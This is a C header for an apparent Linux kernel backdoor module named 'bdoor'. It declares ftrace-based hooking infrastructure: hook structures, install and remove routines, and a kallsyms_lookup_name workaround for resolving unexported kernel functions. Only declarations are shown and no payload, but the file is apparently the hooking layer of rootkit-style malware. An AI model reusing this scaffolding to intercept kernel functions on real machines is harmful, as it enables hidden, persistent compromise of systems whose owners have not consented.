#ifndef BDOOR_LIB
#define BDOOR_LIB 1
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/rhashtable.h>
#include "bdoor_common.h"

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#define HOOK(_name, _hook, _orig)		\
{						\
	.name = (_name),			\
	.fun = (_hook),				\
	.orig = (_orig),			\
}


#define USE_FENTRY_OFFSET 1
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
	const char *name;
	void *fun;
	void *orig;

	unsigned long addr;
	struct ftrace_ops ops;
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
extern kallsyms_lookup_name_t kallsyms_lookup_namez;

#define GET_FUNC_ADDR(name,signature,ret_type)                  \
({                                                              \
        unsigned long addr = kallsyms_lookup_namez((name));     \
        (ret_type (*) signature)(addr);                         \
})

int bdoor_init(void);
int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

#endif
